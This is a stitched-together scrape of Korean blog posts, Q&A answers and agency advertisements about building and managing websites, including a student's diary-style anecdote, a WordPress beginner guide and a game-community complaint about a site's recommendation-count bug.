정보와 FTP정보 <- 여기서 정보라는것은 아이디와 비번이죠 ㅋ    이 두가지만 받으시면 됩니다. 3. 솔직히 말해서 지금 홈페이지가 어떤 언어로 되어있는지 모르겠습니다.    일단 기본적으로 html은 공부를 하셔야 할것이고, 관리할 홈페이지의 언어만 보시면 관리하실수 있을꺼라 생각됩니다.    만약 큰 수정이나 이런것이 있다면 단순한 관리차원이 아닌 제작이니 그부분은 생략하지요. ^^ 도움이 되셨나요? 그럼 좋은 하루 되세요~ Novel style아침, 선생님께서 들어오셔서 알릴 말이 있는지 잠시 뜸을 들이다 말씀하신다."이번에 학교에서 한 반에 한 명씩 학급 홈페이지 관리자를 뽑아야 한다고 하네.."힐끔힐끔 이쪽을 쳐다보신다. 혹시, 이거 나한테 맡으라고 하시는 거..?"어디 할 사람 없나?"성가신 일이라고들 생각하는 건지 아무도 손을 들지 않는다. 이렇게 되면 타깃은 나로 정해지는 건데.. 아니 ,솔직히 하기 싫은 맘도 없지만 요즘 시간이 너무 쪼달려서 하라고 해도 제대로 일을 못할 것 같다. 책임지지 못할 일은 처음부터 손에 쥐지 않는 법.그렇게 가치판단으로 인한 내적갈등을 하던 중, 선생님의 손이 내 어깨 위에 강하게 내려앉는다. 순간 좀 무서웠다.."하고싶은 사람 없나~?"확실하다. 내게 맡기고 싶으신 거다. 내 눈은 안 쳐다보시고 어깨에 손을 올려놓으시고는 계속해서 애들을 향해 묻는다. 이미 여기저기에서는 선생님의 의도를 알아차린 건지 몇몇 애들이 키득거리는 소리가 들려온다."제가 할게요.."결국 소심하게 손을 들어 그렇게 말하고 말았다. 그러자 선생님은 만족했다는 듯이 웃으시면서 내게 학급 홈페이지 관리자가 할 일에 대해 설명해 주신다."...이따가 학교 방송으로 '학급 홈페이지 관리자들 모이세요.'라고 나오면 네가 가면 된다. 알았지?""네.""그리고 홈페이지 관리자는 특별히 디카를 소지하게 해 주겠다. 교실에서 자는 애들이나 떠드는 애들 찍어서 올려도 좋아."그건 좀 좋을지도..."그럼 잘 해 봐라~"그렇게 해서 학급 홈페이지 관리를 내가 직접 하게 됐다. 중학교 2, 3학년 때도 학급 홈페이지 관리는 항상 내가 했다. 좋아서 하는 거였다. 하지만 그 때는 넘쳐나는 게 시간이었으니까 가끔 수요일 같은 때에 시간을 내서 정성껏 홈페이지를 꾸미기도 하면서 나름 성실히 직무(?)를 수행했다. 하지만 지금은 어떤가. 시간이 넘쳐나긴 커녕 내 컴퓨터 할 시간도 부족한 형편인데, 어떻게 학급 홈페이지를...하지만 맡게된 건 맡게된 것이므로 일단 시키는 것만이라도 제대로 해 봐야겠다. 그나저나 선생님은 내 취미가 이쪽에 있다는 걸 어떻게 아셨지...? 가끔은 이렇게 소설 형식으로 쓰고싶을 때가 있습니다.. ㅋ; 전에 한 번 중학교 성적표 나오는 날 경험을 소설 문체로 써봤던 기억이 있네요. 요즘에 소설은 거의 못쓰고 있습니다. 공부할 시간도 부족해서 바쁜 걸요... ㅜㅜ; 아무튼 지금도 바로 학원에 가 봐야 하겠네요.바야흐로 마치 인터넷 만능의 시대같다.특히 기관의 얼굴은 그 인터넷 홈페이지라 할 수 있겠다.그래서 이에 대한 업무를 맡은 자의 업무는 의외로 막중한 것이라 할 수 있을 것이다. 그런데, 가끔 전직장의 홈페이지를 보면 참 안타까운 마음을 금할 수 없다.전직장의 홈페이지는 사업별로 꽤 여러개가 있었다.나는 영문홈페이지, 그리고 내가 맡았던 연간프로젝트 페이스북을 관리했다.둘다 영문으로 작업되는 것이고 접속하는 사람들의 80%이상이 외국인이라 바쁘다고 누가 대신 관리해줄 수 있는 것도 아니었다.다른 주요 업무도 많았지만, 홈페이지 관리에 힘을 많이 쏟았고 그 업무로 인해 상사와 끊임없이 회의하고 윗선 사무실에 불려들어가 잔소리를 들었던 것은, 그만큼 기관의 얼굴을 만들고 유지하는 일이기때문이었다.지금 내가 관리했던 영문홈페이지는 이전에 내가 끊임없이 올렸던 자료의 40%도 채 올리지 못하고 있다.정보의 양보다 질이 중요하지만, 양이 또한 중요할 수 밖에 없는 것은 실시간 다양한 정보를 올려 다양한 이들의 다양한 욕구를 만족시켜 주거나, 혹은 새로운 것들에 대한 alert역할을 마다하지 않았다고 볼 수 있다.업무 분담이 어떻게 되었는지 알 수 없지만, 표면적인 그 모습을 보고있노라면 애썼던 내 모습이 떠오르면서 쓸쓸함이 밀려온다.페이스북 역시 참으로 애를 먹었던 관리업무였다. 일일이 연수 참가자들과 친구를 맺어 그들에게 수시로 안부를 묻고 한국에서 일어나는 일들을 외국인들을 위해 영어로, 한국인들을 위해 한국어로 번역해 동시에 올렸다.그들과의 네트워크는 그렇게 이어졌다. 금년들어 그 사이트에는 글이 10건도 올라오지 않았다.내 전 팀장의 한마디가 기억난다. 자주 들르지 못해 미안하다는...사막 한복판에 서 있는들, 이보다 황량하지는 않았다.아마 이는 내 지난 노력의 경험이 기억나 그러할 것이다.누구를 탓할 수 없는 것은, 내가 지금 이 일을 하지도, 기관의 내부 상황을 잘 알지도 못함이다. 잠시 그때의 나를 기억해볼까?입사하면서 처음 홈페이지 운영 업무를 시작할때는 배워야 할 것도 많고, 적응해야 할 것도 많고...눈치 볼일도 많고, 업무 협조를 잘 이끌어내지 못해 미루어지는 일도 많았다.그래서 입사 1년차에는 일을 빨리 해내지 못했다. 사무실에서 해야할 업무들은 프라이얼러티를 따져해도 늘 밀리기 일쑤였다.결국 홈페이지에 기관이나 분야 신소식은, 혹은 관련된 번역작업은 주말에 해야하는 경우가 왕왕 있기도 했다.2년차의 나를 돌아보면 일 처리 속도도 빨라지고 직원들간의 협조를 이끌어내는데도 큰 무리가 없었던 것 같다. 해야하는 일 중 직원들이 가장 꺼려하고, 혹은 피하고 싶어하지만 기관을 위해 꼭 잘해야만 하는 것은 홈페이지 관리었다.기관의 온라인 얼굴을 얼마나 이쁘게 자주 가꿔주고 정직한 정보를 빠르게 올리느냐에 따라외부에서 보는 이미지도 달라진다.정작 기관 직원들은 잘 찾지 않더라도 말이다.그 실속과 외양을 잘 찾는 것은 여전히 담당자들에게 고민스러운 일일 것이다.그래도 그 업무의 중요성과 의미를 잘 안다면 그 직원의 업무 가치에 대해 누구나 응원해주기를 바라는 마음뿐이다.그리고 스스로는 자부심을 가질 수 있기를 바라는 마음이다.나 역시 나중에 다른 곳에서 다시 일을 시작한다해도 이 마음을 잊지 않고 싶다.  홈페이지관리비용 쉽게유지할 수 있는 비결은​​대부분이 알고 있듯이 홈페이지를 관리하거나운영하는 것은 전문적으로 배운 경험이 있는분들이 할 수 있는 영역​입니다.​따라서 높은 비용을 들여 홈페이지를 제작했다고하더라도 지속적으로 관리하고 운영하지 않아방치하면 고객의 유입률도 볼 수 없을 뿐더러홍보결과를 받아볼 수도 없습니다.​따라서 홈페이지제작과 운영은 전문업체를 통해진행하시는 것이 고객들이 찾는 홈페이지가 될것이라고 생각합니다.​​ ​​홈페이지를 관리하기 전에는 몇가지 숙지하고있어야 할 사항들이 존재하는데 오늘은 이러한사항들을 알려드리려고 합니다.​먼저 홈페이지주소를 신청하였는지 확인해보셔야하는데, 홈페이지주소는 도메인이라 칭합니다.​도메인의 이름을 신청할 때는 신청자의 이름과연락처, 이메일 주소 등을 도메인 소유자의 것으로 기재하는 것이 필요합니다. 웹사이트제작을전문으로 하는 업체에게 의뢰하였을 경우에는도메인 정보가 제대로 되어있는지 확인해봐야 합니다.​​ ​​두번째로는 우리 기업의 홈페이지가 어느 회사의서비스를 받고 있는지 확인해 보아야 하는데요.​홈페이지의 제작이 완료된 후 운영과 관리를 하기위해서는 관련 정보들을 받아두셔야 합니다.이외에도 FTP정보도 받아야 하는데, 이를 알고있어야 홈페이지를 관리할 때 서버에 접속하여각종 컨텐츠를 변경할 수 있기 때문입니다.​​ ​​이 외에도 홈페이지를 운영하고 관리하기 위해서는 다양하게 챙겨야 하는 사항들이 많습니다.​이러한 사항들을 모두 알고 홈페이지를 운영하기에는 다소 복잡하고 어렵게 느껴지실 수있어 저희 기적컨설팅에서는 지속적인 관리를위해 별도로 공부하거나 자료를 챙기지 않아도쉽고 편리하게 홈페이지를 운영할 수 있도록제작하고 있는 것을 보실 수 있습니다.​​ ​​기업을 설립하고 운영하기 위해서는 홈페이지를제작하여 나의 기업을 알리는 것이 필요합니다.​어떤 스타일의 홈페이지를 제작하느냐에 따라홍보시작의 결과물이 달라질 수 있으니 전문업체를 통해 웹사이트를 구축해야 하는데요.​기업에게 있어서 홈페이지는 얼굴이라고 말할수 있습니다. 고객들은 웹사이트를 보고 기업의이미지를 결정하기에, 좋은 이미지를 만들기위해서는 퀄리티 높은 홈페이지를 만들어야 합니다.​​ ​​그렇다면 기업의 이미지를 결정짓는 홈페이지제작은 어떻게 진행되는 것이 좋을까요?​저희 홈페이지제작업체 기적컨설팅에서는 웹사이트 제작을 하기 전에 먼저 기업의 특성을 파악하는 과정을 우선적으로 거치고 있습니다.​이 과정으로 통해 기업의 목적을 명확히 파악하여 표현하는 것이 중요한데, 단순히 정보만을 소개하고 공유하는 것이 아닌, 이를 활용하여 홍보하고 매출증대의 결과까지 불러오는것이 매우 중요합니다.​​ ​​기업의 특성을 잘 파악하지 않고 홈페이지를 제작하게 되면 마케팅을 진행할 수 없게 됩니다.​따라서 홈페이지에 대한 다양한 경험을 토대로기업을 표현하는 포인트, 고객을 끌어모으기 위한포인트를 잘 하는 오랜 경험을 가지고 있는 전문업체를 찾아 구축하는 것을 권장하여 드립니다.​그렇다면 전문적인 노하우를 가진 업체는 어떻게선정하는 것이 현명한 선택일까요?​​ ​​그건 바로 업체의 포트폴리오를 확인하는 방법이라고 말할 수 있는데, 이는 어떤 기업의 홈페이지를 제작했고, 어떠한 방법으로 제작을 진행했는지를 쉽게 파악할 수 있습니다.​홈페이지제작의 다채로운 경험을 자산으로 생각하는 기적컨설팅에서는 기업이 추구하는 목표와맞는 스타일의 홈페이지를 제작하고 있는데요.​이를 통해 기업의 특징과 장점을 부각시키고단점을 드러내지 않아 경쟁업체들 사이에서눈에 띌 수 있는 결과를 가져오게 됩니다.​​ ​​저희 기적컨설팅은 좋은 과정이 좋은 결과를 만든다는 사실을 알고 있기에 체계적인 제작과정을보유하여 높은 결과를 보여줄 수 있도록 합니다.​가장 먼저 시장조사를 진행하여 기업이 웹상에서나타내는 성향과 특성을 충분하게 파악하고 연구하는 과정을 거치는데요.​이 과정이 끝나고 나면 고객의 니즈와 기업의특성을 명확하게 파악하여 독창성을 살린컨셉을 기획하게 됩니다.​​ ​​모든 기획이 설계되었다면 본격적으로 홈페이지개발에 들어가게 되는데, 이 과정에서는 다양한경험과 노하우를 가지고 있는 기획자, 디자이너,퍼블리셔가 한 팀을 이뤄 개발에 착수합니다.​개발이 완성되고 나면 반복적인 테스트과정을통해 한치의 오차없이 완벽한 결과물을 만들어내고 있는 기적컨설팅의 제작과정!​홈페이지관리비용 생각하지 마시고 편리하게관리할 수 있는 기적컨설팅과 함께 홈페이지제작 진행해보시는 것은 어떨까요?​​ ​기적컨설팅의 다양한 홈페이지제작 경험을 보고싶으시다면 상단 사진을 클릭하시면 보실 수 있습니다.​ ​고객들이 찾는 홈페이지제작을 원하신다면 상단사진을 클릭하여 문의내역을 남겨주세요!​ ​카톡친구추가를 통해 다양한 제작내역을 보실 수있으며 간단한 문의나 상담도 카톡으로 가능합니다.​    브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작www.mmcmso.com 기적컨설팅서울특별시 강남구 도산대로 176 대광빌딩 3층 기적컨설팅 ​ 질문홈페이지 관리할려면 어떤것을 공부해야 합니까?현재 홈페이지는 있습니다.지금까지는 관리업체에 맡겨서 관리했지만경제도 좋지않고 해서 홈페이지를 조금씩 변경도 하고 자료도 올릴려고 합니다.홈페이지를 대대적으로 고치는게 아니고 간단히 하나씩 그림도 바꾸고 자료도 바꿀려고 합니다. 이런 경우 어떤 것을 공부해야 하는지요?자세한 답변 부탁합니다.  답변쫌 막막한 질문입니다. 그림이나 자료라... 우선 ftp를 할줄 아셔야 겠구요.. 홈페이지는 이미지이므로 포토샵두 아셔야 겠네요.. 그다음은 어느자리에 어느것이 들어가냐 하는것인뎅... 그 틀에 그대로 한다면 위에 두가지만으로도 가능은 하지만... ^^ 그다음으로 필요한것은 드림위버나 나모같은 툴 ^^ 이이상은 고급과정이라.. ^^ 분류도 많구요.. 하여튼.. 위에 두가지면 가능할것으로 보이네요... 여기에 자세한 답변은 쫌 불가능할듯.. 여기도 내용에 제약이 있거든요.. ftp, 포토샵, 드림위버 따로 검색해서 보시는게 나을듯 싶네요.. ^^ 각각마다 책이 한권씩 나올만한 분량이라서요. 아 물론 다 알필요는 없지요.. 하지만 어느게 님한테 필요한지는 며느리도 모른다는.. ^^; 도움이 되셨나요? 좋은 하루 되세요~ 원문 url http://kin.naver.com/detail/detail.php?d1id=1&dir_id=109&eid=N7Az0ymWrujNScwQk0eQh0JqR7dOetug오래된 고객사 구인구직사이트의 웹프로그램 수정이 완료되었습니다.노후된 웹사이트이지만, 전면개편은 너무 버거운 큰 작업이기에 최대한 활용을 해야만 합니다.* ASP로 개발된 사이트1. 인재DB 이력서 검색결과 및 팝업보기의 구글(웹문서) 검색결과 제외를 위한 조취robots.txt 설정 : 특정 디렉토리 비허용 처리 (검색 크롤링 제외 규약 설정)2. 개인정보보호강화 조취이력서 팝업 기본 열람은 이제부터회원 로그인 후에 가능합니다.일반 방문자에겐 경고창을 띄웁니다.< 예정작업 >개인정보 암호화저장 및 개인정보보호정책 점검감사합니다.#전주홈페이지관리, #전주홈페이지유지보수, #전주웹프로그램개발전주 웹프로그램개발 / 웹사이트 제작브이디자인 사이트웨어063-232-9297https://siteware.kr브이디자인 사이트웨어사이트웨어(siteware.kr), 브이디자인, 웹프로그램, 웹솔루션, 홈페이지솔루션, 사이트솔루션 개발, 판매siteware.kr 네이버 블로그는 맞지만, 확인불가반응형홈페이지제작제작부터 관리까지 한 번에작은 상점부터 크고 작은 기업까지모든 회사가 가지고 있는궁극적인 목표는 수익창출인데요.​제품이나 서비스를 고객에게제공함으로써 수익을 창출하고이것으로 회사를 운영하게 됩니다.​그렇게 하기 위해선 많은 고객에게우리 회사를 소개하는 적절한 홍보가이루어져야 하는데요.​ ​홍보를 효과적으로 진행하게 된다면우리 회사만의 브랜드 이미지를뚜렷하게 구축을 할 수도 있게 됩니다.​따라서 우리 회사에 적절한 홍보 방식그리고 현재 가장 많은 사람들이 찾는채널을 통해 홍보를 진행하는 것이​똑똑한 마케팅이라고 할 수가 있는데요.​현재 가장 효과적으로그리고 지속 가능한 홍보를 하기 위해선온라인 홍보 방식을 채택하는 것을 추천드립니다.​ ​그 이유는 우리의 일상생활을들여다보면 쉽게 이해할 수가 있는데요.​과거에는 인터넷이 발달되지 않아현수막이나 전단지와 같은오프라인 홍보 방식이 주로 이용되었습니다.​하지만 현재 우리가 살고 있는 지금은전국적으로 넓게 분포되어 있는 인터넷망그리고 그 인터넷을 언제 어디서나이용할 수 있는 다양한 스마트 기기들이 생겨났는데요.​ ​이로 인해 우리는 시공간의 제약을 받지 않고인터넷을 이용해 정보를찾거나 물건을 구매하곤 합니다.​따라서 사람들의 인터넷 사용 빈도수가증가하고 중요해진 만큼온라인 채널을 이용하여 우리 회사를홍보하는 것이 가장 좋은데요.​인터넷 채널은 굉장히 다양하지만그중에서도 가장 기본적인홈페이지제작을 통해 온라인 홍보를시작하는것을 추천드리고 있습니다.​ ​홈페이지는 구성 방식을어떻게 하느냐에 따라모두 다른 성격을 가지게 되는데요.​기업을 소개하는 목적인지물건을 판매하는 목적인지그리고 고객과 소통을 하는 목적인지 등​우리 회사가 가지고 있는 성격에 따라홈페이지는 굉장히 다양해집니다.​그럼에도 불구하고홈페이지제작을 진행할 때공통적으로 진행해야 하는 요소가 있는데요.​ ​바로 홈페이지 유형을 선택하는 것입니다.​우리가 접하는 홈페이지는겉으로는 다 똑같아 보이지만그 안을 들여다보면 세부적으로 다른모습을 가지고 있는데요.​컴퓨터에 최적화가 되어있느냐또는 모바일에 최적화가 되어있느냐에 따라홈페이지의 유형은 모두 달라질 수 있습니다.​ ​하지만 요즘엔 컴퓨터를 시작으로스마트폰이나 태블릿pc 등에서도홈페이지를 접속할 수가 있기 때문에여러 스마트 기기에서 잘 노출이 되는홈페이지 유형을 선택하는 것이 좋은데요.​이에 가장 효과적인 유형은반응형홈페이지라고 할 수 있습니다. 반응형홈페이지란 무엇일까?반응형홈페이지란컴퓨터든, 스마트폰이든다양한 스마트기기의 화면에 홈페이지가최적화된 상태로 노출되는 홈페이지를 말하는데요.​ ​반응형홈페이지제작을 진행한다면접속하는 기기에 관계없이편리한 홈페이지 환경을 제공할 수가 있습니다.​또한, 기기별 홈페이지를각각 제작하지 않아도 되는 것이 큰 장점인데요.​과거엔 모바일과 컴퓨터 홈페이지를각각 만들었다면 오늘날은반응형홈페이지제작을 통해한 번에 제작을 할 수가 있어 제작과 관리의부분에서 큰 편리함을 가지고 있습니다.​ ​반응형홈페이지제작을 진행할 때엔우리 회사의 이미지에 맞는다양한 콘텐츠와 디자인을 통해구성요소를 채우는 것이 좋은데요.​예를 들어 병원 반응형홈페이지제작을하는 경우엔 의료진 소개를 비롯해진료과목 그리고 우리 병원만의 신념이나 철학을홈페이지 안에 담아내는 것이 중요합니다.​추가로 서비스를 제공하는 업종인 만큼고객과 소통을 할 수 있는공간을 담아낸다면 더욱 좋겠죠?​ ​또한, 반응형홈페이지제작을 진행한 후에꾸준한 홈페이지 관리가 필요한데요.​인터넷 환경과 트렌드는 계속해서빠른 속도로 변화를 하고 있기 때문에트렌드를 이끄는 회사의 모습을 갖길 원한다면디자인이나 구성요소를 수정하는 작업을진행하는 것이 좋습니다.​그리고 변화하는 인터넷 환경에 맞춰홈페이지 업데이트를 진행한다면고객에게 보기 좋은 홈페이지를제공할 수가 있습니다.  ​따라서 전문 개발자와 디자이너가 있는홈페이지제작업체를 선택하여꾸준한 관리를 진행해주는것이 좋은데요.​반응형홈페이지제작 업체인기적컨설팅은 전문인력은 물론풍부한 제작 경험까지 가지고 있어만족도 높은 반응형홈페이지를제작해드리고 있습니다.​또한, 영상 및 사진촬영까지함께 진행을 할 수가 있어홈페이지에 들어갈 콘텐츠 손쉽게제작이 가능한데요.​온라인 홍보의 꽃이자지속 가능한 홍보를 위한반응형홈페이지제작​꾸준한 관리가 이루어지는기적컨설팅에서 함께해보세요!​ ​포트폴리오 확인을 하고 싶으시다면위 사진을 클릭해 주세요 :D​ ​추가 문의사항이 있으신 경우언제든 편안하게 문의하시길 바랍니다!​ ​기적컨설팅과 카카오톡 친구를 맺으시면실시간 상담 및 다양한 소식을받아볼 수 있습니다.​   브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작www.mmcmso.com 기적컨설팅서울특별시 강남구 도산대로 176 대광빌딩 3층 기적컨설팅 ​ 기업홈페이지, 교육,학원,아동 홈페이지, 펜션홈페이지,레저홈페이지, 뷰티홈페이지, 웨딩홈페이지공공기관홈페이지, 음식홈페이지, 농장홈페이지, 쇼핑몰홈페이지, 홈페이지 주문제작 사이트 등록 내홈페이지에서 직접 확인할수 있는 관리자모드​>>> 홈페이지제작문의 클릭​ #반응형홈페이지제작 #독립형홈페이지제작 #홈페이지제작관리 #홈페이지맞춤제작 #홈페이지주문제작#홈페이지관리무료 #사이트등록무료 #쇼핑몰홈페이지제작 #모바일홈페이지직접운영할수 있는 홈페이지제작 에서  유지관리 무료서비스까지  회사이미지 확실하게 심어줄수있는다양한 홈페이지 주문제작  광고컨설팅 역시 한번에 상담으로 원스톱으로 운영하는 독립형홈페이지 ​ 업종에 맞는 홈페이지 제작으로 회사이미지가 확달라질수 있는  홈페이지주문제작회사의  이미지는 홈페이지에서 고객분들이  다양한 정보로 얻을수 있게 제작을 해야 업이 될수 있는 장점이 있습니다.홈페이지는 말그대로 내 회사 명함으로 대충이 아닌 전문적으로 제작 유지관리 받으실수있는 홈페이지를 제작해보세요 ​ ​ ​ ​ ​ ​ ​  안녕하세요~!3기 기자단인 가지넣어줘♡입니다.던파통신에 [가지통신] , [가지] 라고 쳐보시면 다른 글들도 나오니, 참고 바랍니다☆ 또한 글 다 읽으신 후에는 추천도 한 번 꾹!눌러주시면 감사하겠습니다 ^^ !   오늘의 토픽 : [ 공식 던파 웹페이지 관리를 좀 더 철저하게..]       안녕하세요, 오랜만입니다. 마피아 이벤트를 기달리던 한 사람입니다. 그래서 한 소리를 안할 수가 없네요.      .선추첨 후선발 방식도 아니고  말그대로 밑도끝도없이 선착순이라는 방식의 이벤트...라는 것에 대해서는 문제삼지 않겠습니다.  방식이야 어떻든간에  민수이벤트때와 같이 나름 참신하고 재미있는 이벤트였습니다.   다만 그렇다면    철저히 준비를 해두셨어야지요...  안그래도 던파 홈페이지의 문제로,  많은 일이 부각되고 있습니다.   던파 마블 사건이 제일 대박을 쳤던 사건이라 볼 수 있겠네요   뿐만아니라 요즘 뜨고있는 던파통신 추천 중복 버그...    딱히 특별한 게시글에 대해서 언급을 하자면,  그것은 그 게시글에 대한 모독이 될수 있으니 특정하게 정하고 하지는 않겠습니다.  다만 게시글이 등록되고, 추천수> 조회수가﻿ 오타가.. 말이 됩니까?    모든 문제애 당사자들이 악용한다는 것에서 시작되겠지만,  애당초 그런 문제를 내포하고 있는 것이 한 게임의 공식 홈페이지라면,  지금의 운영방식이나 문제점을 수정해나가야 하지 않을까요?   한 게임의 소비자이자 유저로서 건의해봅니다.       ﻿짧은 글 읽어주셔서 감사합니다. Have a nice day, See yah!  증거스샷이 없다는 분을 위해 친히 올려봅니다.  이게 던파 홈피 현실이네여 껄껄..   껄껄 제글은 조회수가 519지만 추천수가 547인 뻘글입니다.   ﻿비단 마피아 사건뿐만이 아닙니다. 그저 조금 더 빠릿빠릿하고 체계적인 홈페이지 관리를 원합니다.      이제 수월하게부산 홈페이지 관리글로브임펙트에서~!​디지털시대로 변화하면서홈페이지가 다양하게 많아지고 있죠!​하지만 홈페이지가 다양해질수록탁월한 홈페이지 관리 대행 하는 곳을 찾아야만 했는데그 때 알게된 곳이 글로브임펙트였어요 :>​ © mbaumi, 출처 Unsplash​코로나19가 여파가 계속 되면서홈페이지 관리대행이 더 필요하더라구요,,​처음에는 회사 사람들끼리 으쌰으쌰하면서 서로 관리도 하고열심히 해보자 생각했는데도저히 저희역량으로 하지 못하겠더라구요ㅠㅠ​그래서 결국 여러가지 곳에서 검색하기도 하고 찾아보다가글로브임펙트를 알게되었어요 :D​ ​글로브임펙트는 마케팅, 디자인, 이커머스, 영상, 행사기획 등다양한 분야에서 역량을 키워왔더라구요!​게다가 제일 좋았던 점이부산 홈페이지 관리뿐만 아니라혹시나 홈페이지 디자인 쪽에 마음에 안든 부분도바로 글로브임펙트를 통해 수정이 가능해서 만족 대만족!​ © mohamed_hassan, 출처 Pixabay​초기에는 정말 홈페이지 만드는 거 부터 세심하게 신경썼는데저뿐만 아니라 회사 사람들 모두 일이 많아지면서홈페이지 관리부분에 대해 소홀해지더라구요 ;(​아마 저희 같은 회사나 사업하시는 분들은 공감하시겠죠??그런분들에게 정말 추천드리고 싶은글로브임펙트​​ 워드프레스를 통해 어떤 웹사이트를 운영하던 가장 중요한 관리 방법은 변하지 않습니다. 전문가는 아니지만 4년 동안 워드프레스를 운영하면서 느꼈던 홈페이지 관리 방법에 관해 전달해 드리고 있는데요 많은 장점을 가지고 있는 워드프레스를 효과적으로 운영할 수 있는 종합적인 정리를 먼저 설명하고 각 세부적인 내용들을 쳅터로 분류하도록 하겠습니다.​ 워드프레스 웹사이트 시작하기 chapter.1 (호스팅)​워드프레스를 시작하려면 호스팅 과정이 필요하고 방법은 이전 포스팅을 참고하시기 바랍니다. 호스팅 시 주의해야 하는 것은 호스팅 업체 선택에 있어 용도에 따라 상품을 선택할 수 있어야 합니다. 대형 웹사이트를 운영하기 위해서는 해외 호스팅 업체가 유리하며 간단한 개인 홈피를 위해서는 국내 카폐24와 같은 호스팅을 이용하는 것이 좋습니다.​호스팅은 초보자에게 어려운 분야가 아니지만 무엇이든 처음 전혀 모르는 상태에서는 방법에 대한 올바른 지식이 필요한데요 참고할 수 있는 정보는 유튜브를 통해 확인할 수 있습니다. 아무래도 영상으로 확인하는 것이 포스팅이나 기타 정보 보다는 이해가 빠르기 때문입니다.​chapter.2 (셋팅)​호스팅이 완료 되었다면 워드프레스를 설치하고 기본적인 셋팅이 필요합니다. 설치의 경우 워드프레스 홈페이지를 통해서도 가능하지만 초보 이용자가 쉽게 할 수 있는 방법은 해외 호스팅 업체를 이용해서 바로 설치하는 방법을 추천하고 싶습니다. 참고 내용도 이전 포스팅에 소개되어 있으니 상단 링크를 참고 바랍니다.​설정(셋팅)의 경우에는 중요한 부분은 한국어 셋팅과 읽기 전용에서 포스팅 url 등이 있습니다. 시간대를 서울로 변경해야 하며 워드프레스 관리자 페이지를 통해 기본 셋팅을 한 후 홈페이지 제작이 시작되는데요 셋팅 방법을 소개한 포스팅은 다음 링크를 확인해 주시기 바랍니다.​ 워드프레스 홈페이지 만들기 chapter.3 (코딩)​워드프레스를 포함해서 웹사이트 홈페이지를 디자인하는 가장 중요한 핵심은 무엇일까요? 웹사이트의 용도에 따라 조금씩 달라질 수 있지만 중요한 것은 심플함을 생각해야 합니다. 홈페이지 디자인은 폰트(문자)와 이미지(사진)로 만들어지게 되는데요 이미지를 표현하는 방식이나 폰트를 결정하는 것만으로 많은 차이가 나타나게 됩니다.​제 경험상 하나의 페이지에 2개 이상의 폰트 종류나 3개 이상의 컬러를 함께 표현하는 것은 심플한 디자인을 표현하기 힘들었고 영상이나 이미지 표현의 경우 많은 방식을 이용하는 것 보다는 글의 성격에 맞는 표현 방법을 이용하는 것이 중요했다고 생각됩니다.​홈페이지 디자인의 경우 앞으로 하나 하나 경험했던 내용들의 추가로 전달해 드리도록 하겠습니다.​코딩으로 포함될 수 있는 웹사이트 구성의 경우 페이지와 포스팅으로 소개할 수 있는데요 페이지를 구성하는 방법은 기업 홈페이지 기준 5개 정도 선에서 만드는 것이 적당합니다. 주력 페이지를 통해 하부 페이지를 만드는 것은 상관이 없지만 매인 페이지가 많아지는 것은 이용자가 정보를 확인하는데 도움이 되지 않고 사이트 랭크에도 효과적인 방법이 아닙니다.​디자인과 포스팅 등 모든 코딩 작업에서 가장 핵심적인 부분은 웹의 레이아웃을 결정하는 것인데요 이 부분은 사이트 용도와 직접적인 연관성이 있어 이번 포스팅을 통해 모든 것을 소개할 수 없지만 중요한 부분은 다양한 레이아웃이 가능한 워드프레스의 장점을 활용할 수 있어야 한다는 것입니다.​chapter.4 (검색엔진최적화)​마지막으로 검색엔진에 노출되는 웹사이트에 관해 전달해 드리도록 하겠습니다. 당신의 기업이나 쇼핑몰 등 워드프레스를 이용해 홈페이지를 이용자에게 알리도 싶다면 두 가지를 꼭 기억해야 합니다. 네이버 블로그나 기타 정보 사이트와 마찬가지로 가치 있는 정보를 꾸준하게 발행하는 것이 첫 번째 원칙이며 포털이 원하는 컨텐츠 제작 방식을 이해해야 하는 것이 두 번째 방법입니다.​꾸준함이 주는 것은 워드프레스 웹사이트 랭크(사이트 검색 순위)와 직접적인 연관성이 있습니다. 네이버나 구글 모두 꾸준하게 정보를 발행하는 사이트를 선호하고 이러한 사이트의 경우 랭크 순위가 상승해서 정보를 발행하면 5분이내 포털 검색 순위에 기제되는 등 검색엔진최적화 에서는 가장 중요한 부분입니다.​포털이 원하는 컨텐츠란 어떤 것일까요? 사실 이 부분은 정답이 없지만 필자의 경험 상 새로움과 키워드를 선택하는데 핵심이 있는 것 같습니다. 물론 검색엔진최적화에 맞는 포스팅 작성 방식도 존재하지만 무엇보다 검색 시 유리한 타이틀을 선정하고 새로운 정보를 전달하고 있는 컨텐츠에 포탈은 매력을 느끼는 것으로 생각됩니다.​ 워드프레스 홈페이지 관리 마지막으로 홈페이지 관리 방법에 관해 간단하게 소개하고 이 글을 마치도록 하겠습니다. 사실 이번 포스팅의 목적은 워드프레스를 통해 다양한 홈페이지를 제작하기 위해 고민하고 있는 초보 이용자를 위해 전체적인 가이드를 드리기 위해서 였는데 관리 부분에서는 디테일한 소개보다 위에서 설명했던 것을 종합적으로 요약하는 것으로 준비했습니다.​호스팅의 경우 관리를 위해서는 1년 단위 이상으로 시작하는 것이 좋습니다. 웹사이트를 제작하고 관리할 수 있는 편리한 워드프레스를 호스팅이라는 분야 때문에 스트레스를 받고 싶지 않다면 해외 호스팅 업체를 통해 이용하기를 추천합니다.​디자인과 검색엔진 최적화 관리의 경우 누구나 경험을 통해 지신만의 노하우가 생길 수 있지만 기본적으로 심플한 홈페이지와 꾸준한 컨텐츠 발행을 간과해서는 안됩니다. 특히 컨텐츠를 꾸준하게 발행하기 위해서는 계획적인 관리가 필요한데요 쉽게 말하면 사이트 용도에 맞는 포스팅 소재를 개발해야 한다는 것입니다.​이처럼 워드프레스는 어렵게 생각할 필요가 없는 정말 쉽고 빠르게 홈페이지를 운영할 수 있는 컨텐츠 관리 시스템이라는 것을 기억하시고 여러분도 혼자서 웹사이트를 운영하는 멋진 프로그래머가 되기를 바랍니다. ​  안녕하세요.길을 걸을 때에도굉장히 많이 보이는 곳 바로 병원입니다.병원창업이나 병원을 운영하고 계신 분들도병원홈페이지 제작에 대해 생각해 